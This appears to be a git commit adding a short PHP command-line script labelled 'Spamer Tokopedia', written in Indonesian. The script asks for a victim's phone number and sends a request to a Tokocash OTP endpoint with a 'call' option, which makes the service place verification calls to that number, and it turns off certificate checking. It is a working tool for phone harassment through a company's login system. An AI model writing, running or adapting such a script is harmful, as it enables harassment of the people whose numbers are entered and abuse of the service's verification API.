6b81ff5d3b4147fe31673784b497c0b75fba1fdf
DarkCurut08 <42291700+DarkCurut08@users.noreply.github.com>
2019-10-10 17:07:06 +0700

    Add files via upload

---
+++ data/Call.php
@@ -0,0 +1,20 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "\033[1;32m
+      +---------[ Spamer Tokopedia ]----------+\n";
+echo " [?] Nomer Korban => " ;
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
